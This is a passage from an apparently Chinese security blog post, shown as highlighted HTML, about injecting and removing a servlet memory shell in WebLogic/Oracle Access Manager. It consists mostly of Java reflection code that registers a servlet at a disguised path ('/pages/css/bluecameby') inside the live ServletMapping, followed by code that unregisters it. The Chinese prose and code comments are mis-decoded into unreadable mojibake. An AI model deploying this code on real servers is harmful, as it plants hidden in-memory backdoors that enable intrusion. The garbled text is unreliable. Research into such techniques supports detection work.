</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆåŠŸè·å–åˆ°</p><p><img loading=lazy src=image-20220701173057613.png alt=image-20220701173057613></p><h4 id=æ³¨å†Œservlet>æ³¨å†Œservlet<a hidden class=anchor aria-hidden=true href=#æ³¨å†Œservlet>#</a></h4><p>ä¸ºäº†æ–¹ä¾¿ï¼Œä½¿ç”¨JVMä¸­å·²åŠ è½½äº†çš„ <code>oracle.security.am.pbl.transport.http.AMServlet</code> æš‚æ—¶æ›¿ä»£è‡ªå®šä¹‰çš„servletï¼Œå°è¯•æ³¨å†Œservletã€‚æˆåŠŸå®Œæˆã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-104-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-104-31>31</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>Field field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ä½¿ç”¨ServletStubåŒ…è£…HttpServlet
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Constructor<span style=color:#f92672>&lt;?&gt;</span> ServletStubImplConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Servlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> WebAppServletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HttpServlet httpServlet<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AMServlet</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>ServletStubImpl servletStub <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletStubImpl<span style=color:#f92672>)</span> ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> httpServlet<span style=color:#f92672>,</span> servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ä½¿ç”¨URLMathchHelperåŒ…è£…ServletStub
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Constructor<span style=color:#f92672>&lt;?&gt;</span> URLMatchHelperConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> ServletStubImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Object umh <span style=color:#f92672>=</span> URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> servletStub<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// æ·»åŠ åˆ°ServletMappingä¸­ï¼Œå³ä»£è¡¨æ³¨å…¥servletå†…å­˜é©¬æˆåŠŸ
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> umh<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œé‡åˆ°äº†é—®é¢˜ï¼Œä½¿ç”¨oracle.security.am.pbl.transport.http.AMServlet ä½œä¸ºæ–°æ³¨å†Œæ˜¯servletçš„å¤„ç†ç±»çš„è¯ï¼Œå¯ä»¥æˆåŠŸå®‰è£…å’Œå¸è½½ï¼Œä½†ä½¿ç”¨è‡ªå®šä¹‰å†…åµŒç±»é‡å†™getæ–¹æ³•åˆ™å§‹ç»ˆä¸è¡Œï¼Œæ— æ³•æˆåŠŸååºåˆ—åŒ–ã€‚ä¸è§£ã€‚</p><p><img loading=lazy src=image-20220708152214644.png alt=image-20220708152214644></p><h4 id=åˆ é™¤servlet>åˆ é™¤servlet<a hidden class=anchor aria-hidden=true href=#åˆ é™¤servlet>#</a></h4><p>å¸è½½å†…å­˜é©¬ï¼ŒæˆåŠŸå®Œæˆã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-105-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-105-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>Field field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//å¸è½½å†…å­˜é©¬
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)!=</span><span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>removePattern</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
